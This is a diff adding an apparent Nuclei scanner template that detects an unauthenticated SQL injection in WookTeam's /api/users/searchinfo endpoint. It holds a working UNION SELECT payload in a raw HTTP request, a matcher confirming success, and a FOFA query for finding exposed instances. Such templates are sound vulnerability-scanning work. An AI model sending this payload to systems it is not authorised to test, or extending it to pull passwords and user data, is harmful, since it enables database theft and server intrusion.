@@ -1,0 +1,31 @@
+id: wookteam-searchinfo-sql
+
+info:
+  name: wookteam searchinfo - SQL Injection
+  author: yichen
+  severity: high
+  description: |
+    The WookTeam/app/users/searchinfo interface has an SQL injection vulnerability, which allows unauthenticated malicious attackers to obtain information from the database (such as administrator background passwords, site user personal information). In addition, attackers can even write commands to the server with high privileges, further gaining access to the server system.
+  reference:
+    - https://blog.csdn.net/qq_41904294/article/details/141171898?spm=1001.2014.3001.5502
+  verified: true
+  max-request: 1
+  fofa-query: title="wookteam"
+  tags: wookteam,sqli
+
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /api/users/searchinfo?where[username]=1%27%29+UNION+ALL+SELECT+NULL%2CCONCAT%280x7e%2Cversion%28%29%2C0x7e%29%2CNULL%2CNULL%2CNULL%23 HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    Connection: keep-alive
+
+  matchers:
+    - type: dsl
+      dsl:
+        - contains(body,"log~") && status_code == 200
